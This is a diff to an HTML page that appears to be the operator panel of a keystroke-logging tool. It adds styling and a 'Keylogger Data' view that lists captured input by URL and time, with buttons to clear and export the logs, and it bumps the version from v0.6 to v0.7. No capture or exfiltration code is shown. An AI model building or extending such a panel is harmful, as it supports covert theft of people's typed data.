@@ -404,13 +404,47 @@
         justify-content: space-between;
         align-items: center;
     }
+
+    .keylogger-entries {
+        margin-top: 20px;
+        max-height: 600px;
+        overflow-y: auto;
+    }
+
+    .keylog-entry {
+        background: #2a2a2a;
+        padding: 15px;
+        margin: 10px 0;
+        border-radius: 5px;
+    }
+
+    .keylog-url {
+        color: #c50f1f;
+        font-size: 0.9em;
+        margin-bottom: 8px;
+    }
+
+    .keylog-data {
+        background: #1a1a1a;
+        padding: 10px;
+        border-radius: 4px;
+        font-family: monospace;
+        white-space: pre-wrap;
+        word-break: break-all;
+    }
+
+    .keylog-time {
+        color: #666;
+        font-size: 0.8em;
+        margin-top: 8px;
+    }
     </style>
 </head>
 <body>
 
 <header>
     <img src="/ep/assets/banner.png">
-    <span style="color: #5c5b5b; font-size: small;">v0.6</span>
+    <span style="color: #5c5b5b; font-size: small;">v0.7</span>
 </header>
 
 <div class="container">
@@ -445,7 +479,7 @@
         <h2>Welcome back</h2>
         <div class="warning">
             <h3>This version is not ready for production!</h3>
-            <p>Current version: v0.6</p>
+            <p>Current version: v0.7</p>
         </div>
 
         <h3>Changelog</h3>
@@ -494,6 +528,17 @@
             <button onclick="exportData()" class="copy-button">Export Data</button>
             <input type="file" id="import-file" style="display: none" onchange="importData(this)">
             <button onclick="document.getElementById('import-file').click()" class="copy-button">Import Data</button>
+        </div>
+    </div>
+
+    <div id="keylogger" class="main-content">
+        <h2>Keylogger Data</h2>
+        <div class="keylogger-controls">
+            <button onclick="clearKeylogger()" class="action-button">Clear Logs</button>
+            <button onclick="exportKeylogger()" class="action-button">Export Logs</button>
+        </div>
+        <div class="keylogger-entries">
+            <div id="keylogger-list"></div>
         </div>
     </div>
 </div>
